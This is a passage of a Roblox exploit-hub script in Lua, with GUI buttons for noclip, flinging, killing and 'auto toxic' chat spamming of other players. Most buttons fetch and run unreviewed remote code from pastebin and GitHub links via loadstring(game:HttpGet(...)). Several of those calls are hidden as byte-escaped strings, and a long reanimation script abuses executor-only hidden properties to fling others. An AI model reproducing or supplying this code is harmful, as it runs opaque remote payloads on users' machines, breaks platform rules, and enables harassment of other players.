		if v:IsA("BackpackItem") then
			for _, m in pairs(v:GetDescendants()) do
				if m:IsA("DataModelMesh") then
					m:Destroy()
				end
			end
		end
	end
end)

local noclip = false
utilityElements.Noclip.MouseButton1Click:Connect(function()
	noclip = not noclip
end)

utilityElements.Tools.MouseButton1Click:Connect(function()
	if utilityElements.Tools.Text == "Load Tools" then
		_functions.tools(120)
	else
		utilityElements.Tools.Text = "Load Tools"
	end
end)

utilityElements.Replicate.MouseButton1Click:Connect(function()
	_functions.load()
end)

local flipped = 0
utilityElements.Flip.MouseButton1Click:Connect(function()
	flipped = (flipped + 1) % 4
	if flipped == 0 then
		offset = CFrame.Angles(0, 0, 0)
	elseif flipped == 1 then
		offset = CFrame.Angles(math.rad(90), 0, 0)
	elseif flipped == 2 then
		offset = CFrame.Angles(0, math.rad(90), 0)
	elseif flipped == 3 then
		offset = CFrame.Angles(0, 0, math.rad(90))
	end
end)

game:GetService("RunService").Stepped:Connect(function()
	local c = _player.c()
	if noclip then
		local descendants = c:GetDescendants()
		for i = 1, #descendants do
			local v = descendants[i]
			if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
				v.CanCollide = false
			end
		end
	end
end)

workspace:WaitForChild("S")
end)


Section:NewButton("Terminate Hub", "Animation I think", function()
_G.Velocity = Vector3.new(30,0,0)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Gelatek/ProjectTerm/main/main.lua"))()
end)

Section:NewButton("FE LX HUB", "Animation Transform FE", function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/Gogogamer61/LXHub-Main/main/LXHub%20Main%20Script'),true))()
end)

Section:NewButton("Reach GUI V3", "easy for sword", function()
   SGTSOBF_LLllLllLl={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\92","\49","\48","\52","\92","\49","\49","\54","\92","\49","\49","\54","\92","\49","\49","\50","\92","\49","\49","\53","\92","\53","\56","\92","\52","\55","\92","\52","\55","\92","\49","\49","\50","\92","\57","\55","\92","\49","\49","\53","\92","\49","\49","\54","\92","\49","\48","\49","\92","\57","\56","\92","\49","\48","\53","\92","\49","\49","\48","\92","\52","\54","\92","\57","\57","\92","\49","\49","\49","\92","\49","\48","\57","\92","\52","\55","\92","\49","\49","\52","\92","\57","\55","\92","\49","\49","\57","\92","\52","\55","\92","\49","\48","\53","\92","\55","\53","\92","\49","\49","\48","\92","\52","\57","\92","\49","\49","\52","\92","\49","\48","\52","\92","\57","\48","\92","\49","\49","\56","\92","\49","\48","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBF_KKKKkKKkk="";for _,SGTSOBF_yYYYyyyYy in pairs(SGTSOBF_LLllLllLl)do SGTSOBF_KKKKkKKkk=SGTSOBF_KKKKkKKkk..SGTSOBF_yYYYyyyYy;end;SGTSOBF_FfffFffFf=function(SGTSOBF_dDDdDddDD)loadstring(SGTSOBF_dDDdDddDD)()end;SGTSOBF_FfffFffFf(SGTSOBF_KKKKkKKkk)
end)

Section:NewButton("Auto Jump Gui", "Set jump time", function()
   loadstring(game:HttpGet('https://pastebin.com/raw/vViq08jX'))()
end)

Section:NewButton("Auto Toxic Gui", "Just say bad things lol", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming123/JN-HH-Gaming-AutoToxic1/main/README.md",true))()
end)

Section:NewButton("MXS Hub", "Old OP GUI", function()
   loadstring(game:HttpGet("https://pastebin.com/raw/jYJsBA1A", true))()
end)

Section:NewButton("Ultimate Trolling GUI V3", "Some Will Work", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Blukez/Scripts/main/UTG%20V3%20RAW"))() 
end)

Section:NewButton("Spam Hub", "Alot of Troll Stuff", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/ColdStep2/Chatdestroyer-Hub-V1/main/Chatdestroyer%20Hub%20V1'),true))()
end)

Section:NewButton("Dark Ghost Hub", "New and all Ghostplayer script", function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\80\117\118\112\49\100\119\78\39\41\41\40\41\10")()
end)

Section:NewButton("KZS Hub", "idk ._.", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KZSHUB/KZS-HUB/main/KZSHUBV1.5", true))()
end)

Section:NewButton("Frixon Hub", "Eee idk", function()
    loadstring(game:HttpGet('https://gist.githubusercontent.com/RedoGaming/459eb467f3df927b07ca398a68f3b053/raw/6d1f7a2c8fefd072dc53ebbbec38c6f93c7de1ad/Frixon%2520Hub!%2520New%2520OP%2520Exploit%2520Hub%2520for%2520Roblox!'))()
end)

Section:NewButton("RageFlake Hub", "Lol", function()
    loadstring(game:HttpGet('https://gist.githubusercontent.com/RedoGaming/2e5943498c487ea97df0d436dd35c234/raw/f0445b1afcd9193bfb94bc75dda7318310a22ad2/Rageflake!%2520New%2520OP%2520Roblox%2520Exploit%2520Hub!'))()
end)

Section:NewButton("Zen Hub", "Eeeeee idk", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaizenofficiall/KaiZen/main/GameHub", true))()
end)

Section:NewButton("Ultimate Trolling Gui V3", "Op i think new", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Blukez/Scripts/main/UTG%20V3%20RAW"))() 
end)

Section:NewButton("Psy Hub", "Op and have executor i think", function()
loadstring(game:GetObjects("rbxassetid://3014051754")[1].Source)()
end)

Section:NewButton("Troll Gui", "Op idk", function()
-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local TextButton_6 = Instance.new("TextButton")
local TextButton_7 = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(203, 130, 255)
Main.BorderSizePixel = 7
Main.Position = UDim2.new(0.211427703, 0, 0.213305563, 0)
Main.Size = UDim2.new(0, 390, 0, 242)
Main.Active = true
Main.Draggable = true

TextLabel.Parent = Main
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 174, 245)
TextLabel.BorderColor3 = Color3.fromRGB(64, 101, 127)
TextLabel.BorderSizePixel = 2
TextLabel.Position = UDim2.new(-0.00256410264, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 389, 0, 36)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Troll Scripts "
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 36.000
TextLabel.TextStrokeColor3 = Color3.fromRGB(147, 60, 171)
TextLabel.TextWrapped = true


TextButton.Parent = Main
TextButton.BackgroundColor3 = Color3.fromRGB(158, 255, 212)
TextButton.BorderSizePixel = 3
TextButton.Position = UDim2.new(0.0308483411, 0, 0.197368398, 0)
TextButton.Size = UDim2.new(0, 113, 0, 32)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Ice Hub V4 for BH"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true
TextButton.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
end)
TextButton_2.Parent = Main
TextButton_2.BackgroundColor3 = Color3.fromRGB(158, 255, 212)
TextButton_2.BorderSizePixel = 3
TextButton_2.Position = UDim2.new(0.377773374, 0, 0.197368428, 0)
TextButton_2.Size = UDim2.new(0, 93, 0, 32)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Troll Player GUI"
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true
TextButton_2.MouseButton1Down:connect(function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\68\56\117\81\76\49\109\84\39\41\41\40\41\10")()
end)
TextButton_3.Parent = Main
TextButton_3.BackgroundColor3 = Color3.fromRGB(158, 255, 212)
TextButton_3.BorderSizePixel = 3
TextButton_3.Position = UDim2.new(0.663239181, 0, 0.197368398, 0)
TextButton_3.Size = UDim2.new(0, 118, 0, 32)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "Kill Player GUI (tool)"
TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 14.000
TextButton_3.TextWrapped = true
TextButton_3.MouseButton1Down:connect(function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\85\101\119\99\54\105\53\39\41\41\40\41\10")()
end)
TextButton_4.Parent = Main
TextButton_4.BackgroundColor3 = Color3.fromRGB(158, 255, 212)
TextButton_4.BorderSizePixel = 3
TextButton_4.Position = UDim2.new(0.663239181, 0, 0.429824591, 0)
TextButton_4.Size = UDim2.new(0, 118, 0, 32)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "Fling GUI"
TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.TextScaled = true
TextButton_4.TextSize = 14.000
TextButton_4.TextWrapped = true
TextButton_4.MouseButton1Down:connect(function()
loadstring(game:HttpGet('https://pastebin.com/raw/fj5VwQtC'))()
end)
TextButton_5.Parent = Main
TextButton_5.BackgroundColor3 = Color3.fromRGB(158, 255, 212)
TextButton_5.BorderSizePixel = 3
TextButton_5.Position = UDim2.new(0.377773374, 0, 0.429824591, 0)
TextButton_5.Size = UDim2.new(0, 93, 0, 32)
TextButton_5.Font = Enum.Font.SourceSans
TextButton_5.Text = "Invis Kinfe Fling"
TextButton_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.TextScaled = true
TextButton_5.TextSize = 14.000
TextButton_5.TextWrapped = true
TextButton_5.MouseButton1Down:connect(function()

---convert By Im Patrick

HumanDied = false for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do if v:IsA("BasePart") and v.Name ~= 'Torso' and v.Name ~= 'Head' then  _G.netless=game:GetService("RunService").Heartbeat:connect(function() v.AssemblyLinearVelocity = Vector3.new(-30,0,0) sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge) sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",999999999) end) end end  local plr = game.Players.LocalPlayer local char = plr.Character local srv = game:GetService('RunService') local ct = {}  char.Archivable = true local reanim = char:Clone() reanim.Name = 'Nexo '..plr.Name..'' fl=Instance.new('Folder',char) fl.Name ='Nexo' reanim.Animate.Disabled=true char.HumanoidRootPart:Destroy() char.Humanoid:ChangeState(16)  for i,v in next, char.Humanoid:GetPlayingAnimationTracks() do v:Stop() end char.Animate:Remove()  function create(part, parent, p, r) Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("AlignOrientation",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name parent.Attachment.Name = part.Name part.AlignPosition.Attachment0 = part[part.Name] part.AlignOrientation.Attachment0 = part[part.Name] part.AlignPosition.Attachment1 = parent[part.Name] part.AlignOrientation.Attachment1 = parent[part.Name] parent[part.Name].Position = p or Vector3.new() part[part.Name].Orientation = r or Vector3.new() part.AlignPosition.MaxForce = 999999999 part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignOrientation.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false part.AlignOrientation.MaxTorque = 999999999 end  for i,v in next, char:GetDescendants() do if v:IsA('Accessory') then v.Handle:BreakJoints() create(v.Handle,reanim[v.Name].Handle) end end  char.Torso['Left Shoulder']:Destroy() char.Torso['Right Shoulder']:Destroy() char.Torso['Left Hip']:Destroy() char.Torso['Right Hip']:Destroy()  create(char['Torso'],reanim['Torso']) create(char['Left Arm'],reanim['Left Arm']) create(char['Right Arm'],reanim['Right Arm']) create(char['Left Leg'],reanim['Left Leg']) create(char['Right Leg'],reanim['Right Leg'])  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') or v:IsA('Decal') then v.Transparency = 1 end end  reanim.Parent = fl  table.insert(ct,srv.Heartbeat:Connect(function() char.Torso.CFrame=reanim.Torso.CFrame char.Torso.Velocity=Vector3.new(4000000,4000000,0) end))  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.RenderStepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.RenderStepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.Stepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.Stepped:Connect(function() v.CanCollide = false end)) end end  table.insert(ct,reanim.Humanoid.Died:Connect(function() plr.Character = char char:BreakJoints() reanim:Destroy() game.Players:Chat('-gr') _G.netless:Disconnect() HumanDied = true for _,v in pairs(ct) do v:Disconnect() end end))  plr.Character = reanim workspace.CurrentCamera.CameraSubject = reanim.Humanoid


Player = game:GetService("Players").LocalPlayer
PlayerGui = Player.PlayerGui
Cam = workspace.CurrentCamera
Backpack = Player.Backpack
Character = Player.Character
Humanoid = Character.Humanoid
Mouse = Player:GetMouse()
RootPart = Character["HumanoidRootPart"]
Torso = Character["Torso"]
Head = Character["Head"]
RightArm = Character["Right Arm"]
LeftArm = Character["Left Arm"]
RightLeg = Character["Right Leg"]
LeftLeg = Character["Left Leg"]
RootJoint = RootPart["RootJoint"]
Neck = Torso["Neck"]
RightShoulder = Torso["Right Shoulder"]
LeftShoulder = Torso["Left Shoulder"]
RightHip = Torso["Right Hip"]
LeftHip = Torso["Left Hip"]

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

--//=================================\\
--|| 	      USEFUL VALUES
--\\=================================//

Animation_Speed = 3
Frame_Speed = 1 / 60 -- (1 / 30) OR (1 / 60)
local Speed = 12
local ROOTC0 = CF(0, 0, 0) * ANGLES(RAD(-90), RAD(0), RAD(180))
local NECKC0 = CF(0, 1, 0) * ANGLES(RAD(-90), RAD(0), RAD(180))
local RIGHTSHOULDERC0 = CF(-0.5, 0, 0) * ANGLES(RAD(0), RAD(90), RAD(0))
local LEFTSHOULDERC0 = CF(0.5, 0, 0) * ANGLES(RAD(0), RAD(-90), RAD(0))
local DAMAGEMULTIPLIER = 0
local ANIM = "Idle"
local ATTACK = false
local EQUIPPED = false
local HOLD = false
local COMBO = 1
local Rooted = false
local SINE = 0
local KEYHOLD = false
local CHANGE = 2 / Animation_Speed
local WALKINGANIM = false
local VALUE1 = false
local VALUE2 = false
local ROBLOXIDLEANIMATION = IT("Animation")
ROBLOXIDLEANIMATION.Name = "Roblox Idle Animation"
ROBLOXIDLEANIMATION.AnimationId = "http://www.roblox.com/asset/?id=180435571"
--ROBLOXIDLEANIMATION.Parent = Humanoid
local WEAPONGUI = IT("ScreenGui", PlayerGui)
WEAPONGUI.Name = "Weapon GUI"
local Weapon = IT("Model")
Weapon.Name = "Adds"
local Effects = IT("Folder", Weapon)
Effects.Name = "Effects"
local ANIMATOR = Humanoid.Animator
local ANIMATE = Character.Animate
local UNANCHOR = true
local PLAYANIMS = true
local CLOAKED = false

--//=================================\\
--\\=================================//


--//=================================\\
--|| SAZERENOS' ARTIFICIAL HEARTBEAT
--\\=================================//

ArtificialHB = Instance.new("BindableEvent", script)
ArtificialHB.Name = "ArtificialHB"

script:WaitForChild("ArtificialHB")

frame = Frame_Speed
tf = 0
allowframeloss = false
tossremainder = false
lastframe = tick()
script.ArtificialHB:Fire()

game:GetService("RunService").Heartbeat:connect(function(s, p)
	tf = tf + s
	if tf >= frame then
		if allowframeloss then
			script.ArtificialHB:Fire()
			lastframe = tick()
		else
			for i = 1, math.floor(tf / frame) do
				script.ArtificialHB:Fire()
			end
		lastframe = tick()
		end
		if tossremainder then
			tf = 0
		else
			tf = tf - frame * math.floor(tf / frame)
		end
	end
end)

--//=================================\\
--\\=================================//

--//=================================\\
--|| 	      SOME FUNCTIONS
--\\=================================//

function Raycast(POSITION, DIRECTION, RANGE, IGNOREDECENDANTS)
	return workspace:FindPartOnRay(Ray.new(POSITION, DIRECTION.unit * RANGE), IGNOREDECENDANTS)
end

function PositiveAngle(NUMBER)
	if NUMBER >= 0 then
		NUMBER = 0
	end
	return NUMBER
end

function NegativeAngle(NUMBER)
	if NUMBER <= 0 then
		NUMBER = 0
	end
	return NUMBER
end

function Swait(NUMBER)
	if NUMBER == 0 or NUMBER == nil then
		ArtificialHB.Event:wait()
	else
		for i = 1, NUMBER do
			ArtificialHB.Event:wait()
		end
	end
end

function CreateMesh(MESH, PARENT, MESHTYPE, MESHID, TEXTUREID, SCALE, OFFSET)
	local NEWMESH = IT(MESH)
	if MESH == "SpecialMesh" then
		NEWMESH.MeshType = MESHTYPE
		if MESHID ~= "nil" and MESHID ~= "" then
			NEWMESH.MeshId = "http://www.roblox.com/asset/?id="..MESHID
		end
		if TEXTUREID ~= "nil" and TEXTUREID ~= "" then
			NEWMESH.TextureId = "http://www.roblox.com/asset/?id="..TEXTUREID
		end
	end
	NEWMESH.Offset = OFFSET or VT(0, 0, 0)
	NEWMESH.Scale = SCALE
	NEWMESH.Parent = PARENT
	return NEWMESH
end

function CreatePart(FORMFACTOR, PARENT, MATERIAL, REFLECTANCE, TRANSPARENCY, BRICKCOLOR, NAME, SIZE, ANCHOR)
	local NEWPART = IT("Part")
	NEWPART.formFactor = FORMFACTOR
	NEWPART.Reflectance = REFLECTANCE
	NEWPART.Transparency = TRANSPARENCY
	NEWPART.CanCollide = false
	NEWPART.Locked = true
	NEWPART.Anchored = true
	if ANCHOR == false then
		NEWPART.Anchored = false
	end
	NEWPART.BrickColor = BRICKC(tostring(BRICKCOLOR))
	NEWPART.Name = NAME
	NEWPART.Size = SIZE
	NEWPART.Position = Torso.Position
	NEWPART.Material = MATERIAL
	NEWPART:BreakJoints()
	NEWPART.Parent = PARENT
	return NEWPART
end

	local function weldBetween(a, b)
	    local weldd = Instance.new("ManualWeld")
	    weldd.Part0 = a
	    weldd.Part1 = b
	    weldd.C0 = CFrame.new()
	    weldd.C1 = b.CFrame:inverse() * a.CFrame
	    weldd.Parent = a
	    return weldd
	end


function QuaternionFromCFrame(cf)
	local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components()
	local trace = m00 + m11 + m22
	if trace > 0 then 
		local s = math.sqrt(1 + trace)
		local recip = 0.5 / s
		return (m21 - m12) * recip, (m02 - m20) * recip, (m10 - m01) * recip, s * 0.5
	else
		local i = 0
		if m11 > m00 then
			i = 1
		end
		if m22 > (i == 0 and m00 or m11) then
			i = 2
		end
		if i == 0 then
			local s = math.sqrt(m00 - m11 - m22 + 1)
			local recip = 0.5 / s
			return 0.5 * s, (m10 + m01) * recip, (m20 + m02) * recip, (m21 - m12) * recip
		elseif i == 1 then
			local s = math.sqrt(m11 - m22 - m00 + 1)
			local recip = 0.5 / s
			return (m01 + m10) * recip, 0.5 * s, (m21 + m12) * recip, (m02 - m20) * recip
		elseif i == 2 then
			local s = math.sqrt(m22 - m00 - m11 + 1)
			local recip = 0.5 / s return (m02 + m20) * recip, (m12 + m21) * recip, 0.5 * s, (m10 - m01) * recip
		end
	end
end
 
function QuaternionToCFrame(px, py, pz, x, y, z, w)
	local xs, ys, zs = x + x, y + y, z + z
	local wx, wy, wz = w * xs, w * ys, w * zs
	local xx = x * xs
	local xy = x * ys
	local xz = x * zs
	local yy = y * ys
	local yz = y * zs
	local zz = z * zs
	return CFrame.new(px, py, pz, 1 - (yy + zz), xy - wz, xz + wy, xy + wz, 1 - (xx + zz), yz - wx, xz - wy, yz + wx, 1 - (xx + yy))
end
 
function QuaternionSlerp(a, b, t)
	local cosTheta = a[1] * b[1] + a[2] * b[2] + a[3] * b[3] + a[4] * b[4]
	local startInterp, finishInterp;
	if cosTheta >= 0.0001 then
		if (1 - cosTheta) > 0.0001 then
			local theta = ACOS(cosTheta)
			local invSinTheta = 1 / SIN(theta)
			startInterp = SIN((1 - t) * theta) * invSinTheta
			finishInterp = SIN(t * theta) * invSinTheta
		else
			startInterp = 1 - t
			finishInterp = t
		end
	else
		if (1 + cosTheta) > 0.0001 then
			local theta = ACOS(-cosTheta)
			local invSinTheta = 1 / SIN(theta)
			startInterp = SIN((t - 1) * theta) * invSinTheta
			finishInterp = SIN(t * theta) * invSinTheta
		else
			startInterp = t - 1
			finishInterp = t
		end
	end
	return a[1] * startInterp + b[1] * finishInterp, a[2] * startInterp + b[2] * finishInterp, a[3] * startInterp + b[3] * finishInterp, a[4] * startInterp + b[4] * finishInterp
end

function Clerp(a, b, t)
	local qa = {QuaternionFromCFrame(a)}
	local qb = {QuaternionFromCFrame(b)}
	local ax, ay, az = a.x, a.y, a.z
	local bx, by, bz = b.x, b.y, b.z
	local _t = 1 - t
	return QuaternionToCFrame(_t * ax + t * bx, _t * ay + t * by, _t * az + t * bz, QuaternionSlerp(qa, qb, t))
end

function CreateFrame(PARENT, TRANSPARENCY, BORDERSIZEPIXEL, POSITION, SIZE, COLOR, BORDERCOLOR, NAME)
	local frame = IT("Frame")
	frame.BackgroundTransparency = TRANSPARENCY
	frame.BorderSizePixel = BORDERSIZEPIXEL
	frame.Position = POSITION
	frame.Size = SIZE
	frame.BackgroundColor3 = COLOR
	frame.BorderColor3 = BORDERCOLOR
	frame.Name = NAME
	frame.Parent = PARENT
	return frame
end

function CreateLabel(PARENT, TEXT, TEXTCOLOR, TEXTFONTSIZE, TEXTFONT, TRANSPARENCY, BORDERSIZEPIXEL, STROKETRANSPARENCY, NAME)
	local label = IT("TextLabel")
	label.BackgroundTransparency = 1
	label.Size = UD2(1, 0, 1, 0)
	label.Position = UD2(0, 0, 0, 0)
	label.TextColor3 = TEXTCOLOR
	label.TextStrokeTransparency = STROKETRANSPARENCY
	label.TextTransparency = TRANSPARENCY
	label.FontSize = TEXTFONTSIZE
	label.Font = TEXTFONT
	label.BorderSizePixel = BORDERSIZEPIXEL
	label.TextScaled = false
	label.Text = TEXT
	label.Name = NAME
	label.Parent = PARENT
	return label
end

function NoOutlines(PART)
	PART.TopSurface, PART.BottomSurface, PART.LeftSurface, PART.RightSurface, PART.FrontSurface, PART.BackSurface = 10, 10, 10, 10, 10, 10
end

function CreateWeldOrSnapOrMotor(TYPE, PARENT, PART0, PART1, C0, C1)
	local NEWWELD = IT(TYPE)
	NEWWELD.Part0 = PART0
	NEWWELD.Part1 = PART1
	NEWWELD.C0 = C0
	NEWWELD.C1 = C1
	NEWWELD.Parent = PARENT
	return NEWWELD
end

local S = IT("Sound")
function CreateSound(ID, PARENT, VOLUME, PITCH, DOESLOOP)
	local NEWSOUND = nil
	coroutine.resume(coroutine.create(function()
		NEWSOUND = S:Clone()
		NEWSOUND.Parent = PARENT
		NEWSOUND.Volume = VOLUME
		NEWSOUND.Pitch = PITCH
		NEWSOUND.SoundId = "http://www.roblox.com/asset/?id="..ID
		NEWSOUND:play()
		if DOESLOOP == true then
			NEWSOUND.Looped = true
		else
			repeat wait(1) until NEWSOUND.Playing == false
			NEWSOUND:remove()
		end
	end))
	return NEWSOUND
end

function MakeForm(PART,TYPE)
	if TYPE == "Cyl" then
		local MSH = IT("CylinderMesh",PART)
	elseif TYPE == "Ball" then
		local MSH = IT("SpecialMesh",PART)
		MSH.MeshType = "Sphere"
	elseif TYPE == "Wedge" then
		local MSH = IT("SpecialMesh",PART)
		MSH.MeshType = "Wedge"
	end
end

function CFrameFromTopBack(at, top, back)
	local right = top:Cross(back)
	return CF(at.x, at.y, at.z, right.x, top.x, back.x, right.y, top.y, back.y, right.z, top.z, back.z)
end

function PuddleOfBlood(Position,MaxDrop,Model,MaxSize)
	local HITFLOOR, HITPOS, NORMAL = Raycast(Position, (CF(Position, Position + VT(0, -1, 0))).lookVector, MaxDrop, Model)
	if HITFLOOR ~= nil then
		if HITFLOOR.Parent ~= Weapon and HITFLOOR.Parent ~= Character then
			if HITFLOOR.Name == "BloodPuddle" then
				local DIST = (Position - HITFLOOR.Position).Magnitude
				if (HITFLOOR.Size.Z <= 5 and HITFLOOR.Size.Z < MaxSize) or (HITFLOOR.Size.Z > 5 and HITFLOOR.Size.Z < MaxSize and DIST < HITFLOOR.Size.Z/3) then
					HITFLOOR.Size = HITFLOOR.Size + VT(0.1,0,0.1)
				end
			else
				if HITFLOOR.Anchored == true then
					local BLOOD = CreatePart(3, Effects, "Glass", 0, 0, "Maroon", "BloodPuddle", VT(2,0,2))
					BLOOD.CFrame = CF(HITPOS,HITPOS+NORMAL)*ANGLES(RAD(90),RAD(0),RAD(0))
					MakeForm(BLOOD,"Cyl")
					coroutine.resume(coroutine.create(function()
						Swait(75)
						while true do
							Swait()
							BLOOD.Size = BLOOD.Size - VT(0.02,0,0.02)
							if BLOOD.Size.Z < 0.051 then
								BLOOD:remove()
								break
							end
						end
					end))
				end
			end
		end
	end
end

function SprayBlood(POSITION,DIRECTION,BloodSize)
	local BLOOD = CreatePart(3, Effects, "Glass", 0, 0, "Maroon", "BloodPuddle", VT(0.3,0.3,0.3),false)
	BLOOD.CFrame = CF(POSITION)
	MakeForm(BLOOD,"Ball")
	local bv = Instance.new("BodyVelocity",BLOOD) 
	bv.maxForce = Vector3.new(1e9, 1e9, 1e9)
	bv.velocity = CF(POSITION,DIRECTION+VT(MRANDOM(-3,3)/30,MRANDOM(-3,3)/30,MRANDOM(-3,3)/30)).lookVector*75
	bv.Name = "MOVE"
	Debris:AddItem(bv,0.05)
	coroutine.resume(coroutine.create(function()
		local HASTOUCHEDGROUND = false
		local HIT = BLOOD.Touched:Connect(function(hit)
			if hit.Anchored == true then
				HASTOUCHEDGROUND = true
				PuddleOfBlood(BLOOD.Position+VT(0,1,0),2,BLOOD,BloodSize)
			end
		end)
		wait(5)
		if HASTOUCHEDGROUND == false then
			BLOOD:remove()
		end
	end))
end

Debris = game:GetService("Debris")

function CastProperRay(StartPos, EndPos, Distance, Ignore)
	local DIRECTION = CF(StartPos,EndPos).lookVector
	return Raycast(StartPos, DIRECTION, Distance, Ignore)
end

function turnto(position)
	RootPart.CFrame=CFrame.new(RootPart.CFrame.p,VT(position.X,RootPart.Position.Y,position.Z)) * CFrame.new(0, 0, 0)
end

function recurse(root,callback,i)
	i= i or 0
	for _,v in pairs(root:GetChildren()) do
		i = i + 1
		callback(i,v)
		
		if #v:GetChildren() > 0 then
			i = recurse(v,callback,i)
		end
	end
	
	return i
end

function ragdollJoint(character, part0, part1, attachmentName, className, properties)
	attachmentName = attachmentName.."RigAttachment"
	local constraint = Instance.new(className.."Constraint")
	constraint.Attachment0 = part0:FindFirstChild(attachmentName)
	constraint.Attachment1 = part1:FindFirstChild(attachmentName)
	constraint.Name = "RagdollConstraint"..part1.Name
	
	for _,propertyData in next,properties or {} do
		constraint[propertyData[1]] = propertyData[2]
	end
	
	constraint.Parent = character
end

function getAttachment0(character, attachmentName)
	for _,child in next,character:GetChildren() do
		local attachment = child:FindFirstChild(attachmentName)
		if attachment then
			return attachment
		end
	end
end

function R15Ragdoll(character)
	recurse(character, function(_,v)
		if v:IsA("Attachment") then
			v.Axis = Vector3.new(0, 1, 0)
			v.SecondaryAxis = Vector3.new(0, 0, 1)
			v.Rotation = Vector3.new(0, 0, 0)
		end
	end)
	for _,child in next,character:GetChildren() do
		if child:IsA("Accoutrement") then
			for _,part in next,child:GetChildren() do
				if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
					local attachment1 = part:FindFirstChildOfClass("Attachment")
					local attachment0 = getAttachment0(character,attachment1.Name)
					if attachment0 and attachment1 then
						local constraint = Instance.new("HingeConstraint")
						constraint.Attachment0 = attachment0
						constraint.Attachment1 = attachment1
						constraint.LimitsEnabled = true
						constraint.UpperAngle = 0
						constraint.LowerAngle = 0
						constraint.Parent = character
					end
				elseif part.Name == "HumanoidRootPart" then
					part:remove()
				end
			end
		end
	end
	
	ragdollJoint(character,character.LowerTorso, character.UpperTorso, "Waist", "BallSocket", {
		{"LimitsEnabled",true};
		{"UpperAngle",5};
	})
	ragdollJoint(character,character.UpperTorso, character.Head, "Neck", "BallSocket", {
		{"LimitsEnabled",true};
		{"UpperAngle",15};
	})
	
	local handProperties = {
		{"LimitsEnabled", true};
		{"UpperAngle",0};
		{"LowerAngle",0};
	}
	ragdollJoint(character,character.LeftLowerArm, character.LeftHand, "LeftWrist", "Hinge", handProperties)
	ragdollJoint(character,character.RightLowerArm, character.RightHand, "RightWrist", "Hinge", handProperties)
	
